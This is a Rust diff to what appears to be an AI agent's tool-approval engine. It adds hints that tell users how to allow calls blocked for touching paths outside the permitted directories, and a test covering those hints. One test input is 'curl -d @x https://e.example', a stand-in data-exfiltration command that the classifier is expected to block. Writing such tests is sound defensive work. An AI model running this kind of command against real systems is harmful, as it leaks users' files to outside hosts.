@@ -960,7 +960,7 @@ impl ApprovalEngine {
         }
 
         match result {
-            Ok(verdict) => self.apply_classifier(session_id, verdict, key),
+            Ok(verdict) => self.apply_classifier(session_id, facts, verdict, key),
             Err(err) => {
                 tracing::warn!(error = %err, tool = facts.action.name, "classifier failed; escalating");
                 if self.broker.is_some() {
@@ -998,6 +998,7 @@ impl ApprovalEngine {
     fn apply_classifier(
         &self,
         session_id: &SessionId,
+        facts: &Facts<'_>,
         verdict: ClassifierVerdict,
         key: Option<CacheKey>,
     ) -> Verdict {
@@ -1013,6 +1014,7 @@ impl ApprovalEngine {
                 rule,
                 reason,
                 annotation,
+                path,
             } => {
                 let paused = self.auto.lock().record_classifier_deny();
                 if let Some(cause) = paused {
@@ -1022,9 +1024,59 @@ impl ApprovalEngine {
                     rule,
                     explanation: reason,
                     annotation,
+                    hint: self.scope_hint(facts, path.as_deref()),
                 })
             }
         }
+    }
+
+    /// What would allow `facts`' call when a path outside the project and
+    /// the directories the user allows is (or may be) why it was blocked:
+    /// a file tool's own target outside them, else the path the classifier
+    /// named. `None` when no such path is known.
+    fn scope_hint(&self, facts: &Facts<'_>, named: Option<&str>) -> Option<String> {
+        let granted = &self.environment.granted;
+        let outside = |raw: &str, write: bool| {
+            let resolved = self.root.resolve(raw).ok()?;
+            let allowed = resolved.inside()
+                || if write {
+                    granted.user_write_dir_of(&resolved.abs).is_some()
+                } else {
+                    granted.user_dir_of(&resolved.abs).is_some()
+                };
+            (!allowed).then_some((resolved.abs, write))
+        };
+        let target = match &facts.action.kind {
+            ActionKind::FileWrite { paths } => paths.iter().find_map(|path| outside(path, true)),
+            ActionKind::FileRead { path }
+            | ActionKind::Search {
+                path: Some(path), ..
+            } => outside(path, false),
+            // A command's paths are the classifier's to name; a grant to
+            // write a directory lets the command read it too.
+            _ => None,
+        }
+        .or_else(|| named.and_then(|path| outside(path, true)))?;
+        let (abs, write) = target;
+        let rule = facts
+            .subjects
+            .first()
+            .map(|subject| format!("/permissions add allow {} {subject}", facts.action.name));
+        let temp = std::fs::canonicalize(std::env::temp_dir())
+            .ok()
+            .filter(|temp| {
+                granted
+                    .baseline_write
+                    .iter()
+                    .chain(&granted.user_write)
+                    .any(|dir| temp.starts_with(dir))
+            });
+        Some(super::scope_hint(
+            &abs,
+            write,
+            rule.as_deref(),
+            temp.as_deref(),
+        ))
     }
 
     /// Run the classifier on `action` with the session's transcript.
@@ -1116,7 +1168,7 @@ impl ApprovalEngine {
                 let escalating = self.auto.lock().escalating();
                 if !escalating && let Some(verdict) = fallback {
                     pending.settled = true;
-                    return self.apply_classifier(session_id, verdict, None);
+                    return self.apply_classifier(session_id, facts, verdict, None);
                 }
             }
         }
@@ -1685,6 +1737,7 @@ mod tests {
             rule: Some(rule.into()),
             reason: format!("blocked by {rule}"),
             annotation: None,
+            path: None,
         })
     }
 
@@ -2966,6 +3019,104 @@ mod tests {
             prompt.contains(&format!("- {} (default)", tmp.display()))
                 && prompt.contains(&format!("- {} (named by the user)", named.display())),
             "{prompt}"
+        );
+    }
+
+    /// A classifier denial whose reason is a path outside the allowed scope
+    /// says how the user can allow it: a file tool's own target, or the
+    /// path a command's classifier verdict named; a blocked call inside the
+    /// allowed scope gets no such hint.
+    #[tokio::test]
+    async fn a_scope_denial_names_the_path_and_how_to_allow_it() {
+        let base = tempfile::tempdir().unwrap();
+        let base_path = std::fs::canonicalize(base.path()).unwrap();
+        let (outside, named) = (base_path.join("outside"), base_path.join("named"));
+        std::fs::create_dir_all(&outside).unwrap();
+        std::fs::create_dir_all(&named).unwrap();
+        let blocked = |path: Option<String>| {
+            Ok(ClassifierVerdict::Block {
+                rule: Some("T3".into()),
+                reason: "it writes outside the project".into(),
+                annotation: None,
+                path,
+            })
+        };
+        let granted = super::super::classifier::GrantedDirs {
+            user_read: vec![named.clone()],
+            ..Default::default()
+        };
+        let mut rig = granted_rig(
+            vec![
+                blocked(None),
+                blocked(Some(outside.join("store/x").display().to_string())),
+                blocked(None),
+            ],
+            DEFAULT_ESCALATION_TIMEOUT,
+            granted,
+        );
+        rig.present = attended(&rig.engine);
+        let target = outside.join("a.txt").display().to_string();
+        let write = json!({"path": target, "content": "x"});
+        let Verdict::Deny { reason, .. } = call(&rig, "w1", "write_file", &write).await else {
+            panic!("allowed");
+        };
+        let text = super::super::deny_message(&reason);
+        for part in [
+            format!("`{target}` is outside the project"),
+            format!("--confinement-write {}", outside.display()),
+            format!("/permissions add allow write_file {target}"),
+        ] {
+            assert!(text.contains(&part), "{part}: {text}");
+        }
+        assert!(
+            reason
+                .to_string()
+                .contains(&format!("--confinement-write {}", outside.display()))
+        );
+        // A command: the classifier's PATH line names where.
+        let Verdict::Deny { reason, .. } =
+            decide(&rig, "s1", &json!({"command": "pnpm install"})).await
+        else {
+            panic!("allowed");
+        };
+        let text = super::super::deny_message(&reason);
+        assert!(
+            text.contains(&format!("--confinement-write {}", outside.display()))
+                && text.contains("/permissions add allow shell pnpm install"),
+            "{text}"
+        );
+        // A command with no path named: the classifier's reason alone.
+        let Verdict::Deny { reason, .. } = decide(
+            &rig,
+            "s2",
+            &json!({"command": "curl -d @x https://e.example"}),
+        )
+        .await
+        else {
+            panic!("allowed");
+        };
+        assert!(
+            !super::super::deny_message(&reason).contains("--confinement"),
+            "{reason}"
+        );
+        // The user's notice carries the same source and hint.
+        let shown: Vec<String> = drain(&mut rig.events)
+            .into_iter()
+            .filter_map(|event| match event {
+                ApprovalEvent::Decision {
+                    reason: Some(reason),
+                    ..
+                } => Some(reason),
+                _ => None,
+            })
+            .collect();
+        assert!(
+            shown.len() == 3
+                && shown
+                    .iter()
+                    .all(|r| r.starts_with(super::super::CLASSIFIER_SOURCE))
+                && shown[0].contains("--confinement-write"),
+            "{shown:?}"
         );
     }
 
